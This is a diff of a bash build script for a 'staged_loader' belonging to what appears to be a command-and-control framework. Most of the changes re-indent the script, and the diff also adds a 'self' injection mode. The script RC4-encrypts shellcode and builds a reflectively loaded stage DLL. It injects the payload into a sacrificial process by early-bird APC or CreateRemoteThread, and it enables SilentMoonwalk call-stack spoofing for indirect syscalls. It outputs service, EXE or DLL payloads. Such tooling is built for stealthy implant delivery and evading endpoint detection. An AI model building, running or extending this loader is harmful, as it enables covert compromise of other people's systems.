@@ -40,7 +40,7 @@ DEBUG_CHILD="0"
 CC_OVERRIDE=""
 
 print_usage() {
-  cat <<'EOF'
+	cat <<'EOF'
 usage: build.sh --shellcode <agent.bin> [options]
 
 options:
@@ -64,9 +64,11 @@ options:
                        install zig from https://ziglang.org/download)
   --key <hex>          RC4 key for the shellcode blob as hex; random 16-byte
                        key when omitted
-  --inject <apc|ct>    load method: apc = early-bird QueueUserAPC (default),
+  --inject <apc|ct|self>
+                       load method: apc = early-bird QueueUserAPC (default),
                        ct = classic CreateRemoteThread (needs a sacrificial
-                       that stays alive)
+                       that stays alive), self = run the blob in the loader
+                       process without spawning a sacrificial
   --smw <on|off>       SilentMoonwalk call-stack spoofing for the loader's
                        indirect syscalls (x64 only; default: on)
   --verify-ms <n>      milliseconds to watch the spawned process after
@@ -81,125 +83,125 @@ EOF
 
 # resolve to an absolute path without requiring the target to exist
 abspath() {
-  local p="$1"
-  case "$p" in
-  /* | [A-Za-z]:* | //*)
-    printf '%s' "$p"
-    ;;
-  *)
-    local d b resolved
-    d="$(dirname "$p")"
-    b="$(basename "$p")"
-    if resolved="$(cd "$d" 2>/dev/null && pwd)"; then
-      printf '%s/%s' "$resolved" "$b"
-    else
-      printf '%s/%s' "$(pwd)" "$p"
-    fi
-    ;;
-  esac
+	local p="$1"
+	case "$p" in
+	/* | [A-Za-z]:* | //*)
+		printf '%s' "$p"
+		;;
+	*)
+		local d b resolved
+		d="$(dirname "$p")"
+		b="$(basename "$p")"
+		if resolved="$(cd "$d" 2>/dev/null && pwd)"; then
+			printf '%s/%s' "$resolved" "$b"
+		else
+			printf '%s/%s' "$(pwd)" "$p"
+		fi
+		;;
+	esac
 }
 
 needs_value() {
-  case "$1" in
-  --shellcode | --output | --process | --process-args | --process_args | --arch | --cc | --key | --inject | --format | --smw | --verify-ms | --verify_ms)
-    return 0
-    ;;
-  esac
-  return 1
+	case "$1" in
+	--shellcode | --output | --process | --process-args | --process_args | --arch | --cc | --key | --inject | --format | --smw | --verify-ms | --verify_ms)
+		return 0
+		;;
+	esac
+	return 1
 }
 
 set_opt() {
-  local key="$1" val="$2"
-  case "$key" in
-  --shellcode) SHELLCODE="$val" ;;
-  --output) OUTPUT="$val" ;;
-  --process) PROCESS="$val" ;;
-  --process-args | --process_args) PROCESS_ARGS="$val" ;;
-  --arch) ARCH="$val" ;;
-  --cc) CC_OVERRIDE="$val" ;;
-  --key) KEY="$val" ;;
-  --inject) INJECT="$val" ;;
-  --format) FORMAT="$val" ;;
-  --smw)
-    case "$val" in
-    on | true | 1 | yes | "") SMW="on" ;;
-    off | false | 0 | no) SMW="off" ;;
-    *) SMW="$val" ;;
-    esac
-    ;;
-  --verify-ms | --verify_ms) VERIFY_MS="$val" ;;
-  --debug-child | --debug_child)
-    case "$val" in
-    false | 0 | no | "") DEBUG_CHILD="0" ;;
-    *) DEBUG_CHILD="1" ;;
-    esac
-    # the debugger path logs via the DEBUG-gated helpers
-    [[ "$DEBUG_CHILD" == "1" ]] && DEBUG_FLAG="1"
-    ;;
-  --debug)
-    case "$val" in
-    true | 1 | yes) DEBUG_FLAG="1" ;;
-    false | 0 | no | "") DEBUG_FLAG="" ;;
-    *) DEBUG_FLAG="1" ;;
-    esac
-    ;;
-  esac
+	local key="$1" val="$2"
+	case "$key" in
+	--shellcode) SHELLCODE="$val" ;;
+	--output) OUTPUT="$val" ;;
+	--process) PROCESS="$val" ;;
+	--process-args | --process_args) PROCESS_ARGS="$val" ;;
+	--arch) ARCH="$val" ;;
+	--cc) CC_OVERRIDE="$val" ;;
+	--key) KEY="$val" ;;
+	--inject) INJECT="$val" ;;
+	--format) FORMAT="$val" ;;
+	--smw)
+		case "$val" in
+		on | true | 1 | yes | "") SMW="on" ;;
+		off | false | 0 | no) SMW="off" ;;
+		*) SMW="$val" ;;
+		esac
+		;;
+	--verify-ms | --verify_ms) VERIFY_MS="$val" ;;
+	--debug-child | --debug_child)
+		case "$val" in
+		false | 0 | no | "") DEBUG_CHILD="0" ;;
+		*) DEBUG_CHILD="1" ;;
+		esac
+		# the debugger path logs via the DEBUG-gated helpers
+		[[ "$DEBUG_CHILD" == "1" ]] && DEBUG_FLAG="1"
+		;;
+	--debug)
+		case "$val" in
+		true | 1 | yes) DEBUG_FLAG="1" ;;
+		false | 0 | no | "") DEBUG_FLAG="" ;;
+		*) DEBUG_FLAG="1" ;;
+		esac
+		;;
+	esac
 }
 
 # ---- parse args (order independent, tolerant of unknown flags such as the
 # ---- universal --token/--user/--ticket injected by the C2 console)
 while [[ $# -gt 0 ]]; do
-  case "$1" in
-  --help | -h)
-    print_usage
-    exit 0
-    ;;
-  --debug-child | --debug_child)
-    if [[ $# -ge 2 ]] && [[ "$2" != --* ]]; then
-      case "$2" in
-      false | 0 | no | "") DEBUG_CHILD="0" ;;
-      *) DEBUG_CHILD="1" ;;
-      esac
-      shift 1
-    else
-      DEBUG_CHILD="1"
-    fi
-    # the debugger path logs via the DEBUG-gated helpers
-    [[ "$DEBUG_CHILD" == "1" ]] && DEBUG_FLAG="1"
-    shift 1
-    ;;
-  --debug)
-    # boolean-ish flag; may be followed by an explicit value from the C2
-    # console (--debug false/true) or appear bare
-    if [[ $# -ge 2 ]] && [[ "$2" != --* ]]; then
-      case "$2" in
-      true | 1 | yes) DEBUG_FLAG="1" ;;
-      false | 0 | no | "") DEBUG_FLAG="" ;;
-      *) DEBUG_FLAG="1" ;;
-      esac
-      shift 1
-    else
-      DEBUG_FLAG="1"
-    fi
-    shift 1
-    ;;
-  --*=*)
-    set_opt "${1%%=*}" "${1#*=}"
-    shift 1
-    ;;
-  --*)
-    if needs_value "$1" && [[ $# -ge 2 ]] && [[ "$2" != --* ]]; then
-      set_opt "$1" "$2"
-      shift 2
-    else
-      set_opt "$1" ""
-      shift 1
-    fi
-    ;;
-  *)
-    shift 1
-    ;;
-  esac
+	case "$1" in
+	--help | -h)
+		print_usage
+		exit 0
+		;;
+	--debug-child | --debug_child)
+		if [[ $# -ge 2 ]] && [[ "$2" != --* ]]; then
+			case "$2" in
+			false | 0 | no | "") DEBUG_CHILD="0" ;;
+			*) DEBUG_CHILD="1" ;;
+			esac
+			shift 1
+		else
+			DEBUG_CHILD="1"
+		fi
+		# the debugger path logs via the DEBUG-gated helpers
+		[[ "$DEBUG_CHILD" == "1" ]] && DEBUG_FLAG="1"
+		shift 1
+		;;
+	--debug)
+		# boolean-ish flag; may be followed by an explicit value from the C2
+		# console (--debug false/true) or appear bare
+		if [[ $# -ge 2 ]] && [[ "$2" != --* ]]; then
+			case "$2" in
+			true | 1 | yes) DEBUG_FLAG="1" ;;
+			false | 0 | no | "") DEBUG_FLAG="" ;;
+			*) DEBUG_FLAG="1" ;;
+			esac
+			shift 1
+		else
+			DEBUG_FLAG="1"
+		fi
+		shift 1
+		;;
+	--*=*)
+		set_opt "${1%%=*}" "${1#*=}"
+		shift 1
+		;;
+	--*)
+		if needs_value "$1" && [[ $# -ge 2 ]] && [[ "$2" != --* ]]; then
+			set_opt "$1" "$2"
+			shift 2
+		else
+			set_opt "$1" ""
+			shift 1
+		fi
+		;;
+	*)
+		shift 1
+		;;
+	esac
 done
 
 # zig is the explicit cross compiler: one pinned toolchain across hosts keeps
@@ -208,27 +210,27 @@ done
 # overrides it, e.g. to use a mingw-w64 gcc.
 case "$ARCH" in
 x64 | amd64)
-  DEFAULT_CC="zig cc -target x86_64-windows-gnu"
-  ARCH_SMW_OK=1
-  NASM_FORMAT="win64"
-  ;;
+	DEFAULT_CC="zig cc -target x86_64-windows-gnu"
+	ARCH_SMW_OK=1
+	NASM_FORMAT="win64"
+	;;
 x86 | 386)
-  DEFAULT_CC="zig cc -target x86-windows-gnu"
-  ARCH_SMW_OK=0
-  NASM_FORMAT=""
-  ;;
+	DEFAULT_CC="zig cc -target x86-windows-gnu"
+	ARCH_SMW_OK=0
+	NASM_FORMAT=""
+	;;
 *)
-  echo "[-] unsupported arch: $ARCH (use x64 or x86)" >&2
-  exit 1
-  ;;
+	echo "[-] unsupported arch: $ARCH (use x64 or x86)" >&2
+	exit 1
+	;;
 esac
 
 # --cc overrides the default cross compiler. The value may carry arguments
 # (e.g. "zig cc -target x86_64-windows-gnu"), so keep it as an array.
 if [[ -n "$CC_OVERRIDE" ]]; then
-  read -r -a CC_CMD <<<"$CC_OVERRIDE"
+	read -r -a CC_CMD <<<"$CC_OVERRIDE"
 else
-  read -r -a CC_CMD <<<"$DEFAULT_CC"
+	read -r -a CC_CMD <<<"$DEFAULT_CC"
 fi
 CC="${CC_CMD[0]}"
 
@@ -237,86 +239,93 @@ SMW_FLAG=""
 
 HOSTCC=""
 for c in cc gcc clang; do
-  if command -v "$c" >/dev/null 2>&1; then
-    HOSTCC="$c"
-    break
-  fi
+	if command -v "$c" >/dev/null 2>&1; then
+		HOSTCC="$c"
+		break
+	fi
 done
 
 # ---- validate ----
 if [[ -z "$SHELLCODE" ]]; then
-  echo "[-] --shellcode is required" >&2
-  print_usage
-  exit 1
+	echo "[-] --shellcode is required" >&2
+	print_usage
+	exit 1
 fi
 if [[ ! -f "$SHELLCODE" ]]; then
-  echo "[-] shellcode file not found: $SHELLCODE" >&2
-  exit 1
+	echo "[-] shellcode file not found: $SHELLCODE" >&2
+	exit 1
 fi
 if [[ -z "$HOSTCC" ]]; then
-  echo "[-] no host C compiler found (need cc/gcc/clang for the RC4 pack helper)" >&2
-  exit 1
+	echo "[-] no host C compiler found (need cc/gcc/clang for the RC4 pack helper)" >&2
+	exit 1
 fi
 if ! command -v "$CC" >/dev/null 2>&1; then
-  echo "[-] missing cross compiler: $CC" >&2
-  echo "    install zig and put it on PATH (https://ziglang.org/download), or" >&2
-  echo "    pass --cc to use a mingw-w64 gcc instead" >&2
-  exit 1
+	echo "[-] missing cross compiler: $CC" >&2
+	echo "    install zig and put it on PATH (https://ziglang.org/download), or" >&2
+	echo "    pass --cc to use a mingw-w64 gcc instead" >&2
+	exit 1
 fi
 if [[ -n "$SMW_FLAG" ]] && ! command -v nasm >/dev/null 2>&1; then
-  echo "[-] missing nasm (required when --smw on; use --smw off to disable)" >&2
-  exit 1
+	echo "[-] missing nasm (required when --smw on; use --smw off to disable)" >&2
+	exit 1
 fi
 case "$FORMAT" in
 service | exe | dll) ;;
 *)
-  echo "[-] unsupported --format: $FORMAT (use service, exe or dll)" >&2
-  exit 1
-  ;;
+	echo "[-] unsupported --format: $FORMAT (use service, exe or dll)" >&2
+	exit 1
+	;;
 esac
 if [[ "$SMW" != on && "$SMW" != off ]]; then
-  echo "[-] unsupported --smw: $SMW (use on or off)" >&2
-  exit 1
+	echo "[-] unsupported --smw: $SMW (use on or off)" >&2
+	exit 1
 fi
+case "$INJECT" in
+apc | ct | self) ;;
+*)
+	echo "[-] unsupported --inject: $INJECT (use apc, ct or self)" >&2
+	exit 1
+	;;
+esac
 if [[ ! "$VERIFY_MS" =~ ^[0-9]+$ ]]; then
-  echo "[-] --verify-ms must be a non-negative integer" >&2
-  exit 1
+	echo "[-] --verify-ms must be a non-negative integer" >&2
+	exit 1
 fi
 
 SHELLCODE_ABS="$(abspath "$SHELLCODE")"
 
 # ---- default output name reflects the format ----
 if [[ -z "$OUTPUT" ]]; then
-  base="$(basename "$SHELLCODE_ABS")"
-  case "$base" in
-  *.bin) base="${base%.bin}" ;;
-  *.*) base="${base%.*}" ;;
-  esac
-  case "$base" in
-  *.exe) base="${base%.exe}" ;;
-  esac
-  case "$FORMAT" in
-  service) OUTPUT="$(dirname "$SHELLCODE_ABS")/${base}_svc.exe" ;;
-  exe) OUTPUT="$(dirname "$SHELLCODE_ABS")/${base}_loader.exe" ;;
-  dll) OUTPUT="$(dirname "$SHELLCODE_ABS")/${base}_loader.dll" ;;
-  esac
+	base="$(basename "$SHELLCODE_ABS")"
+	case "$base" in
+	*.bin) base="${base%.bin}" ;;
+	*.*) base="${base%.*}" ;;
+	esac
+	case "$base" in
+	*.exe) base="${base%.exe}" ;;
+	esac
+	case "$FORMAT" in
+	service) OUTPUT="$(dirname "$SHELLCODE_ABS")/${base}_svc.exe" ;;
+	exe) OUTPUT="$(dirname "$SHELLCODE_ABS")/${base}_loader.exe" ;;
+	dll) OUTPUT="$(dirname "$SHELLCODE_ABS")/${base}_loader.dll" ;;
+	esac
 fi
 OUTPUT_ABS="$(abspath "$OUTPUT")"
 mkdir -p "$(dirname "$OUTPUT_ABS")"
 
 if [[ "$FORMAT" == service ]]; then
-  STAGE_SERVICE_FLAG=""
+	STAGE_SERVICE_FLAG=""
 else
-  STAGE_SERVICE_FLAG="-DSTAGED_LOADER_NO_SERVICE"
+	STAGE_SERVICE_FLAG="-DSTAGED_LOADER_NO_SERVICE"
 fi
 
 echo "[+] staged_loader build:"
 if [[ -n "$SMW_FLAG" ]]; then
-  SMW_DESC="enabled (x64)"
+	SMW_DESC="enabled (x64)"
 elif [[ "$ARCH_SMW_OK" == 1 ]]; then
-  SMW_DESC="disabled"
+	SMW_DESC="disabled"
 else
-  SMW_DESC="n/a (x86)"
+	SMW_DESC="n/a (x86)"
 fi
 echo "    shellcode: $SHELLCODE_ABS ($(wc -c <"$SHELLCODE_ABS" | tr -d '[:space:]') bytes)"
 echo "    arch:      $ARCH"
@@ -336,43 +345,43 @@ BUILDDIR="$(mktemp -d "${TMPDIR:-/tmp}/staged_loader.XXXXXX")"
 trap 'rm -rf "$BUILDDIR"' EXIT
 
 cp "$SCRIPT_DIR"/loader.c "$SCRIPT_DIR"/stager.c "$SCRIPT_DIR"/dllhost.c \
-  "$SCRIPT_DIR"/bootstrap.c "$SCRIPT_DIR"/bootstrap.h \
-  "$SCRIPT_DIR"/reflect.c "$SCRIPT_DIR"/reflect.h \
-  "$SCRIPT_DIR"/stage_abi.h "$SCRIPT_DIR"/stage_data.h \
-  "$SCRIPT_DIR"/pack.c "$SCRIPT_DIR"/config.h \
-  "$SCRIPT_DIR"/../../c_agent/src/util/rc4.c \
-  "$SCRIPT_DIR"/../common/ntsys.c "$SCRIPT_DIR"/../common/ntsys.h \
-  "$BUILDDIR"/
+	"$SCRIPT_DIR"/bootstrap.c "$SCRIPT_DIR"/bootstrap.h \
+	"$SCRIPT_DIR"/reflect.c "$SCRIPT_DIR"/reflect.h \
+	"$SCRIPT_DIR"/stage_abi.h "$SCRIPT_DIR"/stage_data.h \
+	"$SCRIPT_DIR"/pack.c "$SCRIPT_DIR"/config.h \
+	"$SCRIPT_DIR"/../../c_agent/src/util/rc4.c \
+	"$SCRIPT_DIR"/../common/ntsys.c "$SCRIPT_DIR"/../common/ntsys.h \
+	"$BUILDDIR"/
 # rc4.c includes its header as "util/rc4.h" (the c_agent util/ layout), so
 # keep that path here too.
 mkdir -p "$BUILDDIR/util"
 cp "$SCRIPT_DIR"/../../c_agent/include/util/rc4.h "$BUILDDIR/util/"
 if [[ -n "$SMW_FLAG" ]]; then
-  mkdir -p "$BUILDDIR/smw"
-  cp "$SCRIPT_DIR"/../common/smw/* "$BUILDDIR/smw/"
+	mkdir -p "$BUILDDIR/smw"
+	cp "$SCRIPT_DIR"/../common/smw/* "$BUILDDIR/smw/"
 fi
 
 # ---- bake build config into config.h (escape C wide strings) ----
 esc_c() {
-  printf '%s' "$1" | sed 's/\\/\\\\/g; s/"/\\"/g'
+	printf '%s' "$1" | sed 's/\\/\\\\/g; s/"/\\"/g'
 }
 {
-  printf '/* generated by build.sh */\n'
-  printf '#ifndef STAGED_LOADER_CONFIG_H\n'
-  printf '#define STAGED_LOADER_CONFIG_H\n'
-  printf '#define SACRIFICIAL_PROCESS L"%s"\n' "$(esc_c "$PROCESS")"
-  printf '#define SACRIFICIAL_ARGS L"%s"\n' "$(esc_c "$PROCESS_ARGS")"
-  printf '#define INJECT_VERIFY_MS %s\n' "$VERIFY_MS"
-  printf '#define INJECT_DEBUG_CHILD %s\n' "$DEBUG_CHILD"
-  printf '#endif /* STAGED_LOADER_CONFIG_H */\n'
+	printf '/* generated by build.sh */\n'
+	printf '#ifndef STAGED_LOADER_CONFIG_H\n'
+	printf '#define STAGED_LOADER_CONFIG_H\n'
+	printf '#define SACRIFICIAL_PROCESS L"%s"\n' "$(esc_c "$PROCESS")"
+	printf '#define SACRIFICIAL_ARGS L"%s"\n' "$(esc_c "$PROCESS_ARGS")"
+	printf '#define INJECT_VERIFY_MS %s\n' "$VERIFY_MS"
+	printf '#define INJECT_DEBUG_CHILD %s\n' "$DEBUG_CHILD"
+	printf '#endif /* STAGED_LOADER_CONFIG_H */\n'
 } >"$BUILDDIR/config.h"
 
 # Native MinGW gcc needs a Windows temp path when invoked from MSYS/Cygwin;
 # otherwise it falls back to C:\Windows and fails to create temporary files.
 # TMPDIR stays a POSIX path for mktemp; TMP/TEMP are what gcc reads.
 if command -v cygpath >/dev/null 2>&1; then
-  TMP_WIN="$(cygpath -w "${TMPDIR:-${TMP:-/tmp}}")"
-  export TMP="$TMP_WIN" TEMP="$TMP_WIN"
+	TMP_WIN="$(cygpath -w "${TMPDIR:-${TMP:-/tmp}}")"
+	export TMP="$TMP_WIN" TEMP="$TMP_WIN"
 fi
 
 cd "$BUILDDIR"
@@ -383,41 +392,42 @@ cd "$BUILDDIR"
 PACK_OUT="pack"
 "$HOSTCC" -O2 -Wall -o "$PACK_OUT" pack.c rc4.c
 if [[ ! -x "$PACK_OUT" && -x "pack.exe" ]]; then
-  PACK_OUT="pack.exe"
+	PACK_OUT="pack.exe"
 fi
 if [[ -n "$KEY" ]]; then
-  ./"$PACK_OUT" "$SHELLCODE_ABS" payload.bin key.bin "$KEY"
+	./"$PACK_OUT" "$SHELLCODE_ABS" payload.bin key.bin "$KEY"
 else
-  ./"$PACK_OUT" "$SHELLCODE_ABS" payload.bin key.bin
+	./"$PACK_OUT" "$SHELLCODE_ABS" payload.bin key.bin
 fi
 
 INJECT_FLAG=""
 [[ "$INJECT" == ct ]] && INJECT_FLAG="-DCLASSIC_INJECT"
+[[ "$INJECT" == self ]] && INJECT_FLAG="-DSELF_LOAD"
 
 # ---- build the stage DLL (the real loader, mapped only in memory) ----
 "${CC_CMD[@]}" -O2 -Wall -Wextra ${DEBUG_FLAG:+-DDEBUG} $INJECT_FLAG $STAGE_SERVICE_FLAG \
-  -DUNICODE -D_UNICODE -DWINVER=0x0601 -D_WIN32_WINNT=0x0601 $SMW_FLAG \
-  -I. -c loader.c -o loader_stage.o
+	-DUNICODE -D_UNICODE -DWINVER=0x0601 -D_WIN32_WINNT=0x0601 $SMW_FLAG \
+	-I. -c loader.c -o loader_stage.o
 "${CC_CMD[@]}" -O2 -Wall -Wextra $SMW_FLAG -I. -c ntsys.c -o ntsys.o
 "${CC_CMD[@]}" -O2 -Wall -Wextra -c rc4.c -o rc4.o
 STAGE_OBJS="loader_stage.o rc4.o ntsys.o"
 if [[ -n "$SMW_FLAG" ]]; then
-  "${CC_CMD[@]}" -O2 -Wall -Wextra -I. -c smw/SilentMoonwalk.c -o smw/SilentMoonwalk.o
-  nasm -f "$NASM_FORMAT" smw/DesyncSpoofer.asm -o smw/DesyncSpoofer.o
-  STAGE_OBJS="$STAGE_OBJS smw/SilentMoonwalk.o smw/DesyncSpoofer.o"
+	"${CC_CMD[@]}" -O2 -Wall -Wextra -I. -c smw/SilentMoonwalk.c -o smw/SilentMoonwalk.o
+	nasm -f "$NASM_FORMAT" smw/DesyncSpoofer.asm -o smw/DesyncSpoofer.o
+	STAGE_OBJS="$STAGE_OBJS smw/SilentMoonwalk.o smw/DesyncSpoofer.o"
 fi
 # --dynamicbase keeps the base relocation table; the reflective loader needs
 # it to map the DLL away from its preferred base.
 "${CC_CMD[@]}" -O2 -s -shared -Wl,--dynamicbase -Wl,--nxcompat -o stage.dll \
-  $STAGE_OBJS -ladvapi32 -lshell32
+	$STAGE_OBJS -ladvapi32 -lshell32
 
 if [[ ! -s stage.dll ]]; then
-  echo "[-] stage DLL link produced an empty output" >&2
-  exit 1
+	echo "[-] stage DLL link produced an empty output" >&2
+	exit 1
 fi
 if [[ "$(head -c 2 stage.dll | od -An -tx1 | tr -d ' \n')" != "4d5a" ]]; then
-  echo "[-] stage DLL is not a PE" >&2
-  exit 1
+	echo "[-] stage DLL is not a PE" >&2
+	exit 1
 fi
 
 # ---- RC4-encrypt the stage DLL (fresh random key per build) ----
@@ -433,8 +443,8 @@ fi
 # build's stage_data.o (old stage/payload/key). Emit a per-build unique
 # comment to force a cache miss while everything else still hits the cache.
 {
-  printf '/* build %s */\n' "$BUILDDIR"
-  cat <<'EOF'
+	printf '/* build %s */\n' "$BUILDDIR"
+	cat <<'EOF'
 #if defined(__i386__)
 #define SYM(x) _##x
 #else
@@ -472,34 +482,34 @@ EOF
 
 HOST_OBJS="bootstrap.o reflect.o rc4_host.o stage_data.o"
 if [[ "$FORMAT" == dll ]]; then
-  "${CC_CMD[@]}" -O2 -Wall -Wextra ${DEBUG_FLAG:+-DDEBUG} -c dllhost.c -o host.o
-  # --dynamicbase lets the DLL relocate when mapped in memory.
-  "${CC_CMD[@]}" -O2 -s -shared -Wl,--dynamicbase -Wl,--nxcompat -o loader_out.dll \
-    host.o $HOST_OBJS -lshell32
-  BUILT="loader_out.dll"
+	"${CC_CMD[@]}" -O2 -Wall -Wextra ${DEBUG_FLAG:+-DDEBUG} -c dllhost.c -o host.o
+	# --dynamicbase lets the DLL relocate when mapped in memory.
+	"${CC_CMD[@]}" -O2 -s -shared -Wl,--dynamicbase -Wl,--nxcompat -o loader_out.dll \
+		host.o $HOST_OBJS -lshell32
+	BUILT="loader_out.dll"
 else
-  "${CC_CMD[@]}" -O2 -Wall -Wextra ${DEBUG_FLAG:+-DDEBUG} -DUNICODE -D_UNICODE \
-    -DWINVER=0x0601 -D_WIN32_WINNT=0x0601 -c stager.c -o host.o
-  "${CC_CMD[@]}" -O2 -s -o loader_out.exe host.o $HOST_OBJS -lshell32
-  BUILT="loader_out.exe"
+	"${CC_CMD[@]}" -O2 -Wall -Wextra ${DEBUG_FLAG:+-DDEBUG} -DUNICODE -D_UNICODE \
+		-DWINVER=0x0601 -D_WIN32_WINNT=0x0601 -c stager.c -o host.o
+	"${CC_CMD[@]}" -O2 -s -o loader_out.exe host.o $HOST_OBJS -lshell32
+	BUILT="loader_out.exe"
 fi
 
 # ---- sanity check the PE before copying it out ----
 if [[ ! -s "$BUILT" ]]; then
-  echo "[-] link produced an empty output" >&2
-  exit 1
+	echo "[-] link produced an empty output" >&2
+	exit 1
 fi
 magic="$(head -c 2 "$BUILT" | od -An -tx1 | tr -d ' \n')"
 if [[ "$magic" != "4d5a" ]]; then
-  echo "[-] output is not a PE ($magic)" >&2
-  exit 1
+	echo "[-] output is not a PE ($magic)" >&2
+	exit 1
 fi
 
 cp "$BUILT" "$OUTPUT_ABS"
 SIZE="$(wc -c <"$OUTPUT_ABS" | tr -d '[:space:]')"
 echo "[+] generated payload: $OUTPUT_ABS ($SIZE bytes)"
 if command -v sha256sum >/dev/null 2>&1; then
-  echo "    sha256: $(sha256sum "$OUTPUT_ABS" | awk '{print $1}')"
+	echo "    sha256: $(sha256sum "$OUTPUT_ABS" | awk '{print $1}')"
 elif command -v shasum >/dev/null 2>&1; then
-  echo "    sha256: $(shasum -a 256 "$OUTPUT_ABS" | awk '{print $1}')"
+	echo "    sha256: $(shasum -a 256 "$OUTPUT_ABS" | awk '{print $1}')"
 fi
